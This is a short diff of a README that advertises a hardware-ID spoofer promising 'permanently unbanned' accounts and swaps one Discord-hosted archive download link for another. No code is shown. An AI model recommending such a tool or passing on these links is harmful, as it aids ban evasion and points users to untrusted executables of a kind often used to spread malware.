@@ -16,4 +16,4 @@ The new modern Hwid Spoofer & change Your All hardware, Permanently Unbanned & a
 
 
 # Download Link 
-> >https://cdn.discordapp.com/attachments/992736780673617930/993572763958771762/Galaxy_1.zip
+> > https://cdn.discordapp.com/attachments/992736780673617930/993992809038221442/Automic_Spoofer.rar
